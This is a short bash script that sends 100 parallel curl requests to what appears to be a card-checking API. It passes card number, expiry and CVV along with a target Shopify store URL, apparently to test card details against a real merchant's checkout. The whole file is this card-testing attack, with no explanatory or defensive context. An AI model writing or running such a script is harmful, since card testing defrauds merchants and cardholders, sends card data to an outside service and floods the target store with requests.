#!/bin/bash
url="https://api.iplank.pro/shopify?cc=4111111111111111|12|2028|123&max_price=8&site=https://kyliebaby.com"
for i in {1..100}; do
  curl -s -o /dev/null -w "%{http_code}\n" "$url" &
done
wait
